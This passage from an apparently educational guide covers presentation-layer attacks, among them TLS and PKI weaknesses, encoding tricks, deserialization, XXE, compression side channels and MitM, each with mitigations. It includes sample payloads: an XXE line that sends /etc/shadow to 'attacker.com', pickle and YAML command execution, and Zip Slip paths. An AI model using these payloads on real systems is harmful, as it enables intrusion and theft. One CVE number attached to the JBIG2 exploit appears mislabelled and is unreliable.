**Practical collision:** MD5 collision attacks are now practical (< 1 second on modern hardware). SHA-1 is more expensive but within range of nation-state actors.

#### Mitigation — SLOTH
```
| Mitigation | Description |
|------------|-------------|
| **Remove MD5 and SHA-1 from TLS** | RFC 9155 deprecates them |
| **TLS 1.3** | Mandatory SHA-256 minimum, SHA-384 preferred |
| **Certificate policies** | CAs stopped issuing MD5/SHA-1 signed certificates |
```

### 8.13 Raccoon Attack

**CVE:** CVE-2020-1968  
**Published:** September 2020  
**Targets:** TLS 1.2 and earlier with DHE cipher suites

#### The Attack

Raccoon is a **timing side-channel attack** on the TLS DHE key exchange. It exploits how certain TLS implementations handle the Diffie-Hellman shared secret.

**The vulnerability:**
After DH key exchange, the shared secret is used to derive session keys via a PRF. Before being used in the PRF, leading zero bytes of the DH shared secret are stripped.

If the DH shared secret begins with zero bytes, the PRF input is shorter. This causes a **timing difference** in operations downstream.

**Attack process:**
1. Attacker repeatedly sends modified versions of the DH key share
2. Measures timing of server responses
3. Determines whether the computed shared secret has leading zeros
4. Uses this as an oracle to recover the shared secret over many iterations

**Requirement:** Attacker needs a timing oracle — very sensitive measurements required. The attack is complex and mainly theoretical in most real-world scenarios.

#### Mitigation — Raccoon
```
| Mitigation | Description |
|------------|-------------|
| **Prefer ECDHE over DHE** | ECDHE is not vulnerable to this attack |
| **TLS 1.3** | Removes DHE in favor of ECDHE; different key derivation |
| **Patch implementations** | OpenSSL 1.1.1 and later are patched |
```

## 9. Certificate and PKI Attacks

### What is PKI?

**PKI (Public Key Infrastructure)** is the system of trust that allows certificate-based authentication:

```
Root CA (self-signed, trusted by operating systems)
    └── Intermediate CA (signed by Root CA)
            └── Server Certificate (signed by Intermediate CA)
                        ↑
                  Your web server uses this
```

**Certificate Authorities (CAs):** Organizations trusted to verify identity and issue certificates. Browsers and OS come pre-installed with a list of ~150 trusted Root CAs.

**X.509 Certificate:** The standard certificate format containing:
- Subject (who the cert belongs to)
- Issuer (which CA signed it)
- Public key
- Validity period
- Extensions (SANs, Key Usage, etc.)
- Digital signature from issuer CA

### 9.1 Certificate Forgery

**Definition:** Creating a fake certificate that appears valid.

**Methods:**
1. **MD5 Collision Attack (2008 — "Rogue CA" by Sotirov et al.):**
   - MD5-based certificate signatures can be forged using collision attacks
   - Researchers created a **rogue intermediate CA certificate** that chains to a legitimate root CA
   - Required ~200 PlayStation 3 computers running for 3 days

2. **Compromising a CA's private key:**
   - If an attacker steals the CA's private key, they can sign arbitrary certificates
   - Example: DigiNotar breach (2011) — Iranian attackers issued 531 fraudulent certs

3. **Social Engineering the CA:**
   - Impersonate a domain owner to trick CA into issuing a certificate

**Mitigation:**
- **SHA-256 minimum** for certificate signatures
- **Certificate Transparency (CT) logs** — all certificates must be publicly logged
- **Multi-Perspective Domain Validation** — validate from multiple geographic locations
- **CAA DNS records** — specify which CAs are authorized to issue certs for your domain

### 9.2 Rogue Certificate Authority

**Definition:** Creating a fraudulent CA that can issue trusted certificates.

**Historical cases:**
- **DigiNotar (2011):** Dutch CA compromised, fraudulent Google.com certs issued
- **Comodo (2011):** Attacker obtained fraudulent certs for major sites
- **Trustwave (2012):** Issued subordinate CA cert to a corporation for internal MitM monitoring
- **ANSSI (France, 2013):** Issued intermediate CA used for traffic interception

**Attack flow:**
```
Attacker compromises CA → Issues cert for victim.com with attacker's public key
                        → MitM attack: victim connects to attacker's server
                        → Browser shows padlock (cert is "valid")
                        → Attacker decrypts, re-encrypts, forwards traffic
```

**Mitigation:**
- **Certificate Transparency (CT):** All certs must be logged in public, append-only logs. Monitors can detect unauthorized cert issuance.
- **HPKP (HTTP Public Key Pinning):** Deprecated — too risky, sites were bricking themselves
- **Expect-CT header:** Browser checks CT log inclusion
- **CAA records:** DNS-based restriction on which CAs can issue certs
- **Revocation:** CRL (Certificate Revocation List) and OCSP (Online Certificate Status Protocol)

### 9.3 Certificate Pinning Bypass

**Definition:** Certificate pinning is a security measure where an application hardcodes expected certificate or public key values. Bypassing it allows MitM attacks against the application.

**Why pinning matters:** Mobile applications are particularly vulnerable to MitM on corporate networks or by malicious apps, since users trust whatever cert the device accepts.

**Bypass techniques:**
1. **Hooking frameworks (Frida):** Runtime code modification to intercept the pinning check and return success regardless
2. **Xposed Framework (Android):** Inject modules that override SSL pinning
3. **Custom SSL stack:** Replace the entire SSL library with one that doesn't check pins
4. **OTA update attack:** Deliver a version without pinning via a malicious update
5. **Root/Jailbreak:** Once device is rooted, all SSL checks can be bypassed
6. **Decompile-modify-recompile:** Remove pinning code, resign APK

**Mitigation:**
- **Certificate pinning + tampering detection:** Check app integrity at startup
- **Obfuscation:** Make pinning code harder to find and remove
- **Anti-debugging:** Detect Frida and similar tools
- **Multiple layers:** Combine pinning with binary integrity checks and network-level controls
- **Regular pin rotation:** Preventing pinned certs from becoming stale

### 9.4 Certificate Transparency (CT) Log Manipulation

**CT Logs:** Cryptographic, append-only public logs that record all issued TLS certificates. Browsers require **Signed Certificate Timestamps (SCTs)** proving a cert was submitted to a CT log.

**Attacks:**
- **Split-view CT:** Log shows one cert to the submitter, different cert to monitors. Requires log to be compromised.
- **CT log compromise:** If a log is hacked and certificates are retroactively deleted or modified — but append-only structure prevents this
- **Monitoring gap:** Small organizations may not monitor CT logs for unauthorized certificate issuance against their domains

**Mitigation:**
- **Use multiple CT log submissions** (Google, Cloudflare, DigiCert logs)
- **Monitor CT logs** for your domain: tools like `crt.sh`, Facebook's CT monitor
- **CAA records** in DNS to restrict which CAs can issue
- **SCTS validation:** Ensure browsers validate SCTs from multiple independent logs

### 9.5 OCSP Stapling Attacks

**OCSP (Online Certificate Status Protocol):** Real-time certificate revocation checking. Browser asks the CA "Is this certificate still valid?"

**Problem with basic OCSP:**
- Privacy leak: CA learns which sites you visit
- Performance: Additional round trip
- Availability: If CA's OCSP server is down, browser may accept cert anyway (soft fail)

**OCSP Stapling:** Server fetches and caches the OCSP response, "staples" it to the TLS handshake. More efficient, more private.

**Attacks:**
1. **OCSP Stapling Bypass:** Force degradation to un-stapled OCSP, then block OCSP (soft fail means cert still accepted)
2. **OCSP Response Replay:** If OCSP responses don't include timestamp verification, old responses can be replayed
3. **Network-level DoS on OCSP:** Attacker blocks OCSP, browser soft-fails and accepts revoked cert

**Must-Staple Extension:**
- X.509 extension that tells browsers: "If you don't see a valid stapled OCSP response, reject this cert"
- Hardens against stapling bypass

**Mitigation:**
- Enable **OCSP Stapling** on servers
- Implement **OCSP Must-Staple** certificate extension
- Monitor certificate revocation status continuously
- Consider **CRL (Certificate Revocation List)** as backup

## 10. Cipher Downgrade and Negotiation Attacks

### 10.1 What is a Downgrade Attack?

A **downgrade attack** forces two parties to negotiate a weaker (older) protocol version or cipher suite than they would normally use, exploiting the resulting weakness.

### 10.2 Version Downgrade

**Mechanism:**
```
Client: "I support TLS 1.3, 1.2, 1.1"
[Attacker intercepts and modifies]
Server receives: "I support TLS 1.0"
Server: "OK, let's use TLS 1.0" (vulnerable)
```

**Prevention:**
- **TLS_FALLBACK_SCSV:** Client includes a special pseudo-cipher suite value in downgraded handshakes. Server rejects the connection if it supports a higher version.
- **TLS 1.3:** Includes downgrade protection signals in the ServerHello — detectable by compliant TLS 1.3 implementations

### 10.3 Cipher Suite Downgrade

**Mechanism:** MitM removes strong cipher suites from the ClientHello, forcing negotiation of a weak suite.

**Prevention:**
- **Strict cipher suite configuration:** Servers refuse connections if no mutually supported strong suites exist
- **Mandatory cipher suites in TLS 1.3:** Only 5 cipher suites allowed, all strong

### 10.4 Downgrade Attacks via ClientHello Manipulation

In TLS, the handshake is not authenticated until the **Finished** message. Before that point:
- ClientHello is not signed
- ServerHello is not signed

This creates a window for downgrade attacks. TLS 1.3 addresses this by including a "downgrade sentinel" in the ServerRandom field of ServerHello, detectable by TLS 1.3-aware clients.

## 11. Encoding and Character Set Attacks

### 11.1 Unicode Normalization Attacks

**Background:**  
Unicode has **multiple ways** to represent the same visual character. **Normalization** converts different representations to a canonical form.

For example, the character "é" can be represented as:
- A single precomposed code point: `U+00E9` (é)
- A decomposed form: `U+0065` (e) + `U+0301` (combining acute accent)

**Attack scenario:**

```
Attacker creates username: "admı͏n" (looks like "admin" but uses different codepoints)
System accepts it (no collision with existing "admin")
Later, normalization maps "admı͏n" → "admin"
Attacker now has an account that resolves to "admin"
```

**SQL injection via normalization:**
```
Input:  "ʼ OR ʼ1ʼ=ʼ1"   (uses Unicode apostrophes U+02BC)
Sanitization: removes single quotes — passes
After DB normalization: "' OR '1'='1"   (SQL injection!)
```

**Mitigation:**
- **Normalize to NFC or NFKC before validation**, not after
- Apply security checks **after normalization**
- **Unicode security profiles** — restrict which codepoints are valid in identifiers
- Use **PRECIS framework** (RFC 8264) for usernames and passwords

### 11.2 Homograph Attacks (IDN Homograph)

**IDN (Internationalized Domain Names):** Allows domain names with non-ASCII characters (e.g., `münchen.de`).

**Attack:** Visually identical characters from different Unicode scripts used to create look-alike domains:
```
apple.com       (legitimate — all Latin script)
аpple.com       (malicious — 'а' is Cyrillic U+0430, visually identical to Latin 'a')
```

Rendered in a browser, these look absolutely identical.

**Mitigation:**
- **Browser security:** Modern browsers display Punycode (the ASCII form) for mixed-script domains
- **Punycode display:** `аpple.com` → `xn--pple-43d.com` in browser
- **Domain registrar policy:** Many TLDs restrict mixed-script registrations
- **Certificate checking:** Certificates include the actual domain name — users must inspect

### 11.3 Null Byte Injection

**Definition:** Injecting a null byte (`\0`, ASCII code 0) to exploit differences in how languages handle string termination.

**Why this works:**
- **C language:** Strings end at the first null byte (C strings are null-terminated)
- **Many other languages:** Strings are length-prefixed and can contain null bytes

**Attack example:**
```
User input: "secret.php\0.jpg"

PHP (older versions): Passes validation (ends in .jpg — seems safe)
C runtime (fopen):  Opens "secret.php" (stops at \0 — .jpg is ignored!)
```

**Exploitation targets:**
- File path manipulation (upload `shell.php\0.jpg`, execute as PHP)
- Database queries (truncate input)
- Authentication bypass (username `admin\0anything`)

**Mitigation:**
- **Sanitize null bytes** from all user input
- **Use length-safe string functions** (avoid C-style string functions with untrusted data)
- **Validate file types via magic bytes** (not just extension)
- **Modern language runtimes** largely mitigate this automatically

### 11.4 Overlong UTF-8 Encoding

**Background:**  
UTF-8 is a variable-width encoding. The character 'A' (0x41) is encoded as a single byte. But UTF-8 also allows the same character to be encoded with **unnecessary extra bytes** — this is called an "overlong encoding" and is **explicitly illegal** per the Unicode standard.

```
'/' = 0x2F (valid 1-byte encoding)
'/' = 0xC0 0xAF (overlong 2-byte encoding — INVALID but some parsers accept)
'/' = 0xE0 0x80 0xAF (overlong 3-byte encoding — INVALID)
```

**Attack scenario:**
```
Security check: block "/../" (path traversal)
Attacker sends: "/%c0%ae%c0%ae/"   (overlong encoding of "../")
Naive security check: doesn't see "../" → passes
Vulnerable decoder: decodes to "../" → path traversal!
```

**Historical example:** CVE-2000-0884 — Microsoft IIS vulnerability exploited overlong encodings to bypass security checks and access files outside the web root.

**Mitigation:**
- **Reject overlong encodings** — never decode them to their ASCII equivalents
- **Normalize/validate UTF-8 first,** then apply security checks
- **Use standard, tested UTF-8 libraries** — don't write your own decoder
- Modern libraries correctly reject overlong encodings by default

## 12. Data Format and Serialization Attacks

### What is Serialization?

**Serialization:** Converting an in-memory object (with its data and state) into a format that can be stored or transmitted (bytes, text, JSON, XML).

**Deserialization:** The reverse — reconstructing the object from serialized data.

```
In-memory object: User{name:"Alice", role:"admin"}
                            ↓ serialize
JSON: {"name":"Alice","role":"admin"}
                            ↓ transmit/store
Received JSON: {"name":"Alice","role":"admin"}
                            ↓ deserialize
In-memory object: User{name:"Alice", role:"admin"}
```

### 12.1 Insecure Deserialization

**OWASP Top 10 2021 — A08:** Insecure deserialization enables:
- **Remote Code Execution (RCE)** — most severe
- **Privilege escalation**
- **Replay attacks**
- **Object injection** — altering object state

#### Java Deserialization (The Most Infamous Case)

Java's `ObjectInputStream.readObject()` is notoriously dangerous. When Java deserializes an object, it calls **magic methods** like `readObject()`, `readResolve()`, `finalize()`, etc.

**Gadget Chain:** A sequence of existing classes in the application's classpath that, when chained together through serialization magic methods, produces a dangerous operation (like executing a system command).

```java
// Vulnerable code
ObjectInputStream ois = new ObjectInputStream(untrustedInputStream);
Object obj = ois.readObject(); // DANGEROUS — executes code in untrusted data!
```

**Popular exploitation libraries:**
- **ysoserial** — generates Java deserialization payloads using common gadget chains
- **Commons Collections gadget chain** — most famous; allows command execution via Apache Commons Collections

**Attack flow:**
```
Attacker crafts malicious Java serialized object
         ↓
Object contains gadget chain: 
  InvokerTransformer → calls Runtime.exec("whoami") during deserialization
         ↓
Server deserializes the object
         ↓
Java automatically calls readObject() → triggers gadget chain
         ↓
System command executes on the server
```

**Mitigation — Java Deserialization:**
- **Don't deserialize untrusted data with Java's native serialization**
- Use **serialization filters** (Java 9+ ObjectInputFilter, JEP 290)
- **Allowlisting:** Define exactly which classes can be deserialized
- **Avoid native Java serialization** — use JSON/Protocol Buffers with strict schemas
- **WAF signature-based detection** of serialized Java objects (starts with `0xaced 0x0005`)

#### PHP Object Injection

PHP's `unserialize()` function reconstructs PHP objects from a string representation:

```php
// Vulnerable
$data = unserialize($_COOKIE['data']); // Never! Attacker controls cookie

// Attacker's crafted serialized string
O:8:"SomeClass":1:{s:4:"file";s:9:"/etc/passwd"}
// During deserialization, if SomeClass::__destruct() reads $this->file...
// It can read /etc/passwd!
```

**PHP magic methods exploited:**
- `__destruct()` — called when object is destroyed
- `__wakeup()` — called on deserialization
- `__toString()` — called when object used as string
- `__call()` — called on undefined method invocation

**Mitigation — PHP:**
- **Never unserialize user input**
- Use JSON (`json_decode`) instead
- Implement `__wakeup()` to validate state

#### Python Pickle

Python's `pickle` module is **explicitly documented as dangerous with untrusted data**:

```python
# Vulnerable
import pickle
data = pickle.loads(user_input)  # Can execute arbitrary Python code!

# Attacker's payload creates class with __reduce__ that executes OS command:
import os
class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())  # Sending this to server executes whoami
```

**Mitigation — Python:**
- **Never pickle untrusted data**
- Use JSON, MessagePack, or Protocol Buffers
- If pickle is necessary: use `pickletools.dis()` to analyze before loading, or implement a custom `Unpickler` with strict allowlisting

### 12.2 XML External Entity (XXE) Injection

**Definition:** An attack against applications that parse XML input, exploiting the XML parser's support for external entities.

#### What is an XML Entity?

An **XML entity** is a shorthand reference:
```xml
<!DOCTYPE note [
  <!ENTITY greeting "Hello, World!">
]>
<note>&greeting;</note>
<!-- Renders as: <note>Hello, World!</note> -->
```

**External entities** reference resources outside the XML document:
```xml
<!ENTITY ext_entity SYSTEM "file:///etc/passwd">
```

#### Basic XXE Attack

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

If the XML parser resolves external entities and the server includes entity content in its response, the attacker receives `/etc/passwd`.

#### XXE Variants

**1. Server-Side Request Forgery (SSRF) via XXE:**
```xml
<!ENTITY xxe SYSTEM "http://internal-server.corp/admin">
<!-- Forces the server to make an HTTP request to internal network -->
```

**2. Blind XXE (no direct output):**
```xml
<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
<!-- Exfiltrates /etc/shadow to attacker's server via DNS/HTTP -->
```

**3. Denial of Service — Billion Laughs / XML Bomb:**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- ... repeated to lol9 -->
]>
<root>&lol9;</root>
<!-- Expands to 10^9 "lol" strings — memory exhaustion! -->
```

**4. XXE via SVG:**
```svg
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg>&xxe;</svg>
<!-- SVG files processed as XML — XXE possible if SVGs are parsed server-side -->
```

**5. XXE via XLSX/DOCX:**
Office documents are ZIP archives containing XML files. If these XML files are parsed server-side (e.g., for import functionality), XXE is possible.

**Mitigation — XXE:**
```
| Mitigation | Implementation |
|------------|----------------|
| **Disable external entities** | Primary fix |
| **Disable DTD processing** | Eliminate DOCTYPE entirely |
| **Allowlist input schemas** | Validate XML against a strict schema |
| **Use safe parsers** | JSON APIs preferred over XML |
| **WAF rules** | Block DOCTYPE in XML inputs |
| **Patch parsers** | Outdated parsers may enable entities by default |
```

```python
# Python — Disable XXE in lxml
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.fromstring(xml_data, parser)

# Python — Defusedxml library (recommended)
import defusedxml.ElementTree as ET
tree = ET.fromstring(xml_data)  # Safe by default
```

### 12.3 YAML Deserialization

YAML (YAML Ain't Markup Language) is popular in configuration files. YAML parsers in many languages support **object deserialization** — loading YAML into language-native objects, including executing constructors.

**Python PyYAML — Unsafe loading:**
```python
import yaml

# DANGEROUS — executes arbitrary Python code
data = yaml.load(user_input, Loader=yaml.Loader)

# Attacker payload:
malicious_yaml = "!!python/object/apply:os.system ['whoami']"
yaml.load(malicious_yaml, Loader=yaml.Loader)  # Executes whoami!
```

**The `!!python/object` tag** instructs PyYAML to instantiate Python objects during loading.

**Other language YAML attacks:**
- **Ruby:** `YAML.load` with `Marshal` gadgets
- **Java:** SnakeYAML with gadget chains
- **PHP:** Symfony's YAML component

**Mitigation — YAML:**
```python
# Use safe loader — prevents object deserialization
data = yaml.safe_load(user_input)  # Does not execute code

# Or use ruamel.yaml with safe mode
from ruamel.yaml import YAML
yaml_parser = YAML(typ='safe')
data = yaml_parser.load(user_input)
```

### 12.4 JSON Attacks

JSON is generally safer than XML (no entity references, no DTD), but vulnerabilities exist:

**1. JSON Hijacking (Historical — Fixed in modern browsers):**
Early browsers allowed cross-origin JSON array responses to be read via `<script>` tag hijacking.

**2. Mass Assignment / Parameter Pollution:**
When JSON body is directly mapped to server-side objects:
```json
{"username": "alice", "email": "alice@example.com", "role": "admin"}
```
If the server blindly maps all JSON fields to a User object, an attacker can set `role: "admin"`.

**Mitigation:** Explicit allowlisting of accepted fields; never trust the entire JSON body blindly.

**3. JSON Injection:**
```python
# Server constructs JSON manually (wrong approach)
json_response = '{"user": "' + username + '", "role": "user"}'
# Attacker username: admin", "role": "admin
# Result: {"user": "admin", "role": "admin", "role": "user"} → first role may win!
```

**Mitigation:** Always use a proper JSON serialization library.

**4. Deeply Nested JSON (ReDoS/DoS):**
```json
{"a":{"a":{"a":{"a": ... deeply nested 10,000 levels...}}}}
```
Processing deeply nested JSON can cause stack overflow, OOM, or exponential processing time.

**Mitigation:** Limit JSON nesting depth; set parser limits.

## 13. Compression-Based Attacks

### Summary of Compression Attacks
```
| Attack | Target | Mechanism |
|--------|---------|-----------|
| CRIME | TLS compression | Measures compressed TLS record sizes |
| BREACH | HTTP gzip | Measures HTTP response sizes with reflected input |
| HEIST | HTTP/2 Server Push | Measures response sizes with timing |
| VORACLE | VPN compression | Extracts HTTP plaintext from compressed VPN tunnel |
| TIME | Browser timing | Timing-based variant of BREACH |
```
### HEIST Attack

**Full Name:** HTTP Encrypted Information can be Stolen through TCP-windows  
**Published:** 2016  
**Mechanism:** Uses JavaScript to measure the size of HTTPS responses **via TCP window size timing** — without needing a MitM position.

**Why it's more dangerous than BREACH:** BREACH requires MitM. HEIST only requires malicious JavaScript on the same page (cross-origin).

**Mitigation:** Same as BREACH — randomize secrets, don't mix with reflected content.

### VORACLE Attack

**Published:** 2018  
**Target:** OpenVPN with compression enabled  
**Mechanism:** If VPN compresses HTTP traffic before encrypting, an attacker-controlled website can use JavaScript to measure response sizes in the compressed VPN tunnel, extracting HTTP plaintext cookie values.

**Mitigation:** Disable compression in VPN protocols.

### General Compression Security Rules

1. **Never compress and encrypt secrets in the same context** as user-controlled data
2. **Disable TLS-level compression** (universally done now)
3. **Disable HTTP compression for sensitive responses** (auth tokens, CSRF tokens)
4. **Randomize secret tokens** per response (masking)
5. **SameSite cookies** reduce the attack surface by preventing cross-origin cookie inclusion

## 14. Data Exfiltration via Presentation Layer

### 14.1 Steganography

**Definition:** The art of hiding data within other data or media, such that the existence of the hidden data is not apparent.

> **Difference from encryption:** Encryption makes data unreadable but visible. Steganography makes data invisible.

**Carriers (cover media):**
- **Image files** (JPEG, PNG, BMP, GIF)
- **Audio files** (MP3, WAV)
- **Video files** (MP4, AVI)
- **Document files** (PDF, DOCX)
- **Network traffic timing** (LSB timing channels)
- **Protocol headers** (covert channels in IP ID fields, TCP timestamps)

#### Image Steganography — LSB (Least Significant Bit) Encoding

**RGB pixel:** Each pixel has Red, Green, Blue values (0–255 = 8 bits each).
The **least significant bit** of each color channel contributes very little to visual appearance:

```
Original pixel R: 11001010
                          ↓ change last bit
Modified pixel R: 11001011  ← visually identical, but hides 1 bit of secret
```

By replacing the LSB of each RGB channel:
- 3 bits hidden per pixel
- 1 MB image ≈ 125 KB of hidden data
- **Visually undetectable** to human eye (< 0.4% change in pixel value)

**Example — Hiding "A" (01000001) in pixels:**
```
Pixel 1 R: 1100101[0]  ← store '0'
Pixel 1 G: 0110100[1]  ← store '1'
Pixel 1 B: 1010011[0]  ← store '0'
Pixel 2 R: 0011001[0]  ← store '0'
Pixel 2 G: 1100110[0]  ← store '0'
Pixel 2 B: 0101010[0]  ← store '0'
Pixel 3 R: 1001101[0]  ← store '0'
Pixel 3 G: 0110011[1]  ← store '1'
                           = 01000001 = 'A'
```

#### Real-World Steganography Attacks

- **APT32 (OceanLotus):** Embedded malware C2 (command and control) commands in PNG files
- **Turla APT:** Used steganography in JPEG images for data exfiltration
- **Duqu 2.0:** Hid communication within legitimate-looking traffic
- **Banking trojans:** Embedded configuration in image files hosted on public websites

#### Detecting Steganography (Steganalysis)

- **Statistical analysis:** LSB steganography creates detectable statistical anomalies in pixel LSB distribution
- **Chi-square analysis:** Tests whether LSB distribution is more uniform than expected
- **Tool-specific signatures:** Many steganography tools leave artifacts
- **File size anomalies:** Hidden data may change expected file size
- **Tools:** `stegdetect`, `StegExpose`, `zsteg`, `binwalk`

**Mitigation:**
- **DLP (Data Loss Prevention) systems** with steganalysis capabilities
- **Image transcoding** at network perimeter (changes format, destroying hidden data)
- **Content inspection** at email and web gateways
- **Network monitoring** for unusual traffic to image hosting sites

### 14.2 Format-Based Exfiltration

**Definition:** Using file format metadata and fields to hide exfiltrated data.

**Techniques:**
- **EXIF metadata:** JPEG files contain extensive metadata (GPS, camera model, timestamps) — can hide arbitrary data
- **PDF streams:** Extra compressed streams hidden in PDF structure
- **Office document metadata:** Custom properties in DOCX/XLSX
- **DNS TXT record tunneling:** Encoding data in DNS queries
- **HTTP header fields:** Unusual or custom HTTP headers carrying data
- **Timing covert channels:** Encoding data in packet timing intervals

**Mitigation:**
- **Strip metadata** from all outbound files (e.g., `exiftool -all= file.jpg`)
- **Content inspection** at egress points
- **Data Loss Prevention (DLP)** policies
- **Network monitoring** for DNS tunneling (high volume of TXT queries)

These attacks exploit vulnerabilities in parsers that process file formats — images, documents, archives — at Layer 6.

### 15.1 JPEG/PNG Parser Vulnerabilities

File format parsers are notoriously complex and vulnerability-prone. Classic examples:

- **libpng vulnerability (CVE-2018-13785):** Integer overflow in PNG width/height → heap corruption
- **libjpeg buffer overflow:** Processing crafted JPEG chunks → remote code execution
- **ImageMagick vulnerabilities ("ImageTragick", CVE-2016-3714):** `convert` command injection via malformed image paths in certain formats

**Attack surface:** Any server that processes user-uploaded images (resizing, converting, thumbnailing) is potentially vulnerable.

**Mitigation:**
- Keep image processing libraries updated
- **Sandbox image processing** (Docker containers, separate processes)
- **Use memory-safe languages** for parsers where possible
- **Validate file format** via magic bytes and strict structure checking

### 15.2 PDF Parser Attacks

PDFs are extremely complex (supports JavaScript, forms, embedded files, 3D content). Attack types:
- **JavaScript execution:** PDF readers execute embedded JavaScript (Acrobat Reader, Foxit)
- **Heap spray attacks:** Exploit memory layout via crafted PDF objects
- **LaunchAction:** Some PDF readers can be tricked into executing commands
- **Form data exfiltration:** PDF forms that submit data to external servers

**Mitigation:**
- Disable JavaScript in PDF readers (or use readers without JS support)
- Sandboxed PDF viewer (Chrome's built-in viewer, Firefox)
- **JBIG2 vulnerability** (CVE-2023-28205): NSO Group used a JBIG2-compressed PDF exploit

### 15.3 Office Document Macros (OLE/VBA)

Microsoft Office documents (DOCX, XLSX, PPTM) support VBA macros — effectively a full scripting language.

**Macro-based malware delivery:**
- Email attachment: `Invoice.xlsm` or `Contract.docm`
- User opens document, enables macros
- VBA macro executes: downloads second-stage payload, establishes C2 connection

**Modern defenses:**
- **Mark-of-the-Web (MoTW):** Internet-downloaded files are tagged; macro execution restricted
- **Protected View:** Office opens untrusted files in sandboxed view
- **Group Policy:** Disable macros organization-wide
- **Attack Surface Reduction (ASR) rules:** Microsoft Defender blocks Office macro abuse
- **AMSI integration:** VBA macros scanned by antivirus via AMSI (Antimalware Scan Interface)

### 15.4 Archive Escape Attacks (Zip Slip)

**Zip Slip:** A vulnerability in archive extraction libraries where a crafted archive contains path traversal in filenames:

```
Archive contents:
  ../../../../etc/cron.d/backdoor  ← absolute path or traversal in filename
  ../../../../home/user/.ssh/authorized_keys
```

If the extraction library doesn't sanitize paths, it writes files to arbitrary locations on disk.

**Affected libraries (historical):** Python's zipfile module (fixed), Go's archive/zip, multiple Java libraries.

**Mitigation:**
- Sanitize all paths extracted from archives
- Ensure extracted paths are within the target directory (using `filepath.Clean` and checking prefix)
- Use updated, patched libraries

## 16. Man-in-the-Middle (MitM) at Layer 6

### What is MitM?

A **Man-in-the-Middle attack** occurs when an attacker secretly intercepts and potentially alters communication between two parties who believe they are communicating directly.

### 16.1 SSL Stripping

**Published:** 2009, Moxie Marlinspike  
**Concept:** Attacker positions themselves between client and server. Client thinks it's using HTTP; server thinks the client is connected via HTTPS through a proxy.

**Attack flow:**
```
Client             Attacker              Server
  |                  |                    |
  |---HTTP GET-----→|                    |
  |                  |---HTTPS GET------→|
  |                  |←--HTTPS Response--|
  |←--HTTP Response--|                   |
  |                  |                   |
Client sees HTTP!  Attacker sees plaintext  Server thinks it's secure
```

**Requirements:**
- Attacker must be able to MitM network traffic (local network position, ARP spoofing, rogue Wi-Fi AP)
- Client navigates to an HTTP URL first (before being redirected to HTTPS)

**Why it works:** Browser initially makes an HTTP request. The redirect to HTTPS is sent by the server, but the attacker intercepts it, establishes their own HTTPS connection to the server, and serves the client HTTP.

**Countermeasure — HSTS (HTTP Strict Transport Security):**
HSTS is an HTTP response header that tells the browser: "Never connect to this domain over HTTP — always use HTTPS."

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

Once a browser has seen this header:
- All subsequent connections to the domain are forced to HTTPS **before making the connection**
- SSL stripping fails because the browser never sends the initial HTTP request
- Attacker cannot intercept the redirect

**HSTS Preload:** A hardcoded list of domains built into browsers that always use HTTPS, even on first visit.  
Submit at: https://hstspreload.org

### 16.2 TLS Interception (Corporate Proxies)

**Legitimate use:** Organizations deploy **TLS inspection proxies** (Blue Coat, Palo Alto, Forcepoint) to inspect encrypted traffic for malware and data exfiltration.

**How it works:**
1. Corporate CA certificate is installed on all endpoint devices (as trusted root)
2. Proxy intercepts HTTPS connections, establishes:
   - Its own TLS session with the actual server
   - A separate TLS session with the client, using a certificate signed by the corporate CA
3. Client sees a valid certificate (signed by trusted corporate CA) — no warning

**Security implications of interception:**
- Proxy must be trusted to not store or leak decrypted data
- Introduces additional attack surface (vulnerable proxy software)
- May weaken cipher suites during re-encryption
- Research (2017) showed many commercial TLS interceptors introduced security regressions

**Detecting TLS Interception:**
- Certificate chain analysis (proxy issues its own cert)
- TLS fingerprinting (JA3 hash differs from expected browser fingerprint)
- Supported cipher suite discrepancy

**From an attacker's perspective:** MitM via TLS interception requires installing a custom root CA — possible via:
- Malware
- Physical device access
- Social engineering IT

### 16.3 HSTS Bypass Techniques

Even with HSTS, some bypass techniques exist:

1. **New subdomain:** If HSTS doesn't include `includeSubDomains`, new subdomains are not protected
2. **New domain:** HSTS is per-domain — a new malicious domain isn't protected
3. **First visit attack:** If user has never visited the site, HSTS preload list is the only protection
4. **HSTS cache stripping:** Delete browser's HSTS cache (requires local access)
5. **NTP attack:** Roll back system clock past HSTS max-age expiry

## 17. Padding Oracle Attacks

### General Padding Oracle Framework

A **padding oracle** is any system that reveals (through any means) whether decrypted data has valid padding. Even a binary response (valid/invalid) is enough.

**Oracle types:**
- **Error message:** Server returns "Invalid padding" vs. "Decryption error"
- **Timing oracle:** Valid padding processes faster than invalid
- **Behavioral oracle:** Application behaves differently with valid vs. invalid data
- **HTTP status code oracle:** 200 OK vs. 500 Internal Server Error

### General CBC Padding Oracle Attack

Given a ciphertext encrypted with CBC mode:

```
C = [IV || C₁ || C₂ || ... || Cₙ]

Decryption:
P₁ = Decrypt(C₁) XOR IV
P₂ = Decrypt(C₂) XOR C₁
...
Pₙ = Decrypt(Cₙ) XOR Cₙ₋₁
```

**To recover Pₙ (last block):**

1. Choose a target block Cᵢ
2. Modify Cᵢ₋₁ byte by byte
3. For the last byte: try all 256 values for the last byte of modified C'ᵢ₋₁
4. When the oracle says "valid padding," you know: `Decrypt(Cᵢ)[last byte] XOR modified_byte = 0x01`
5. Therefore: `Decrypt(Cᵢ)[last byte] = 0x01 XOR modified_byte`
6. And: `Pᵢ[last byte] = Decrypt(Cᵢ)[last byte] XOR Cᵢ₋₁[last byte]`

Repeat for each byte, adjusting expected padding values. This recovers the **full plaintext** with at most 256 × block_size oracle queries per block.

### ASP.NET Padding Oracle (2010)

